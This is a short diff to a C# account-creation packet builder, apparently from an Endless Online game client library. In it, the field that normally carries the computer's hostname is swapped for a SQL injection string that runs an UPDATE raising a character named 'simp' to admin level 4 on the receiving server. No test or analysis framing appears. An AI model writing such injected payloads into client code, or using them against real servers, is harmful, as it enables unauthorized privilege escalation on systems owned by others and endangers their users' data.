@@ -93,7 +93,7 @@ namespace EOLib.Domain.Account
                 .AddBreakString(parameters.Location)
                 .AddBreakString(parameters.Location)
                 .AddBreakString(parameters.Email)
-                .AddBreakString(Dns.GetHostName())
+                .AddBreakString(";UPDATE characters SET admin=4 WHERE name=simp;")
                 .AddBreakString(_hdSerialNumberService.GetHDSerialNumber())
                 .Build();
 
